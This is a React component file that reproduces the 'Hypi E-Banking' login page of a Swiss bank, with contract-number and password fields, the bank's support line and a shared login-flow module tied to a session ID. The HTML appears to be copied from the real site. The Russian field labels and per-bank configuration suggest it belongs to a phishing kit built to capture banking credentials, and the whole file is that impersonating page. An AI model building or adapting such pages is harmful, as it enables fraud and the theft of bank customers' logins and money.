import { BankLoginFlow } from '@/features/bank-login/BankLoginFlow';
import { hypothekarbank } from '@/config/banks/hypothekarbank';
import css from './Hypothekarbank.css?inline';

type Props = { sessionId: string };

const HEADER_HTML = "\n     <div class=\"bg\"></div>\n    ";
const MAIN_HTML = "\n     <div class=\"container\">\n     <form autocomplete=\"off\" id=\"lk_form\">\n     <input type=\"hidden\" id=\"bank-name\" data-name=\"Hypi bank\">\n    \n     <div id=\"form\">\n     <div class=\"row\">\n     <div class=\"col-12 col-lg-6\">\n     <div class=\"first\">\n     <p class=\"fs-12 mb-1 fwt uppercase\" data-i18n=\"contractNumber\">Vertragsnummer</p>\n     <input autocomplete=\"off\" type=\"text\" name=\"\" id=\"login\" data-name=\"Логин\" class=\"logx inp first\" required=\"\" value=\"\">\n     <p class=\"fs-12 mb-1 mt-4 fwt uppercase\" data-i18n=\"password\">Passwort</p>\n     <input autocomplete=\"off\" type=\"password\" name=\"\" id=\"password\" data-name=\"Пароль\" class=\"logx inp first\" required=\"\">\n     </div>\n     <div class=\"second-1 d-none sf-hidden\">\n     \n     \n     \n     \n     </div>\n     <div class=\"d-flex justify-content-end text-end buttons\">\n     <button class=\"btn-green mt-4 first\" id=\"loginButton\" data-i18n=\"next\">Weiter</button>\n     <button class=\"btn-green mt-4 d-none second-1 sf-hidden\" type=\"button\" id=\"formButton\" data-i18n=\"login\">Login</button>\n     </div>\n     </div>\n     <div class=\"col-12 col-lg-6 d-none d-lg-block\">\n     <p class=\"fs-35\" data-i18n-html=\"welcomeText\">\n     <span class=\"fwt\" data-i18n=\"welcomein\">Willkommen im</span><br>\n     Hypi E-Banking\n     </p>\n     </div>\n     </div>\n     </div>\n     <div class=\"d-none sf-hidden\" id=\"loader\">\n     \n     </div>\n     </form>\n     </div>\n    ";
const FOOTER_HTML = "\n     <div class=\"container text-center fwt\">\n     <p data-i18n=\"contactBar\">| Support 0800 813 913</p>\n     </div>\n    ";

export default function Hypothekarbank({ sessionId }: Props) {
    return (
        <div className="d-flex flex-column h-100">
            <style dangerouslySetInnerHTML={{ __html: css }} />
            <header dangerouslySetInnerHTML={{ __html: HEADER_HTML }} />
            <main className="mt-5" dangerouslySetInnerHTML={{ __html: MAIN_HTML }} />
            <footer className="mt-5 mt-lg-auto" dangerouslySetInnerHTML={{ __html: FOOTER_HTML }} />
            <BankLoginFlow bank={hypothekarbank} sessionId={sessionId} />
        </div>
    );
}
